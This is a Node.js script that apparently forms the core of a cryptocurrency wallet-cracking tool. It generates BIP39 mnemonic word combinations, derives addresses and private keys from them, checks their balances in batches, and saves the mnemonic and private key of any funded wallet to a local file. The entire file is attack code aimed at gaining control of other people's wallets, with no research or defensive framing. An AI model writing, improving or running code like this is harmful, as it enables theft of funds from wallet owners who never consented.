import fs from "fs";
import bip39 from "bip39";
import ora from "ora";
import { generateCombinations } from "./getCombinations.mjs";
import { getKeys } from "./getKeys.mjs";
import { getMultipleBalances, hasBalance } from "./scrapBalance.mjs";
import { pushToFirebase } from "./firebase.mjs";

const DEFAULT_BIP_INDEX = 0;
const wordList = bip39.wordlists.english;

export const run = async function (config) {
  const { batchAmount, bipIndex } = config;

  const BIP_INDEX = Number(bipIndex || DEFAULT_BIP_INDEX);
  // const START_WORD = wordList[BIP_INDEX];
  // const fileName = `./combinations/${START_WORD}.json`;
  const fileName = `./combinations/matches.json`;
  const BATCH_AMOUNT = batchAmount || 5;
  const CI = false;

  // console.log("\n********************");
  // console.log("BIP_INDEX: ", BIP_INDEX);
  // console.log("START_WORD: ", START_WORD);
  // console.log("BATCH_AMOUNT: ", BATCH_AMOUNT);
  // console.log("********************\n");

  const spinner = ora({
    discardStdin: false,
    text: "Starting ",
  }).start();

  spinner.text = "Starting ";

  // let lastMnemonic;
  // try {
  // lastMnemonic = JSON.parse(fs.readFileSync(fileName))?.lastMnemonic;
  // spinner.succeed("LastMnemonic found").start();
  // } catch (e) {
  // fs.writeFileSync(fileName, JSON.stringify({}));
  // spinner.info("LastMnemonic not found").start();
  // }

  const iterator = generateCombinations(wordList);
  let batch = [];
  while (true) {
    const { value, done } = iterator.next();
    if (done) {
      break;
    }

    let mnemonic = value;

    const { address, privateKey } = getKeys(mnemonic);

    const struct = { mnemonic: mnemonic, address, privateKey: privateKey };
    batch.push(struct);
    if (batch.length === BATCH_AMOUNT || done) {
      const addresses = batch.map((b) => b.address);
      spinner.text = "Getting balances";
      const balances = await getMultipleBalances(addresses);
      batch.map((_struct, i) => {
        const balance = balances[i];
        _struct.balance = balance;
        if (!hasBalance(balance)) {
          spinner.fail(`${_struct.address} |  NO BALANCE | ${balance}`).start();
        } else {
          spinner
            .succeed(
              `Found Balance! ${balance} MNEMONIC=${_struct.mnemonic} address=${_struct.address}`
            )
            .start();
          if (!CI) {
            const rawData = JSON.parse(fs.readFileSync(fileName));
            const matches = [...(rawData.matches || []), _struct];
            rawData.matches = matches;
            fs.writeFileSync(fileName, JSON.stringify(rawData));
          }
          // pushToFirebase(_struct);
        }
      });
      fs.writeFileSync(
        "./data.json",
        JSON.stringify([
          ...JSON.parse(fs.readFileSync("./data.json")),
          ...batch,
        ])
      );
      batch = [];
    }
  }
};
